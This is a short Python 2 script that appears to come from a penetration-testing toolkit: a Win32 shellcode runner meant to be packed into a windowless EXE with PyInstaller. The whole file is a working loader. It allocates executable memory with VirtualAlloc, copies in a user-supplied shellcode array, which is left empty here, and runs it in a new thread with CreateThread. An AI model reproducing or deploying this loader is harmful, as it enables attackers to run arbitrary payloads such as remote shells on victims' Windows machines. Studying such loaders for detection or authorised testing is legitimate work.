#!/usr/bin/python

##############################################################
# PyInstaller Win32 shellcode runner - by @mihi42
#
# Needed software:
# * Python 2.7.2 from 
#   <http://www.python.org/download/releases/>
# * PyWin32 build 217 for Python 2.7 from 
#   <http://sourceforge.net/projects/pywin32/files/pywin32/>
# * PyInstaller 1.5.1 from <http://www.pyinstaller.org/>
#
# Usage:
# * Install and configure the software above
# * Replace the shellcode below if desired (use output type
#   for C and change the first and last line)
# * Run PyInstaller to build an EXE file, using the switches
#   -w -a -F (and maybe more if you prefer)
##############################################################
#
# Paste your shellcode below
#
shellcode = bytearray(
)
##############################################################

import ctypes

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), 
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),
    ctypes.c_int(0x40))

ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr), 
    ctypes.c_int(len(shellcode)))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
    buf,
    ctypes.c_int(len(shellcode)))

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_int(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),
    ctypes.c_int(-1))
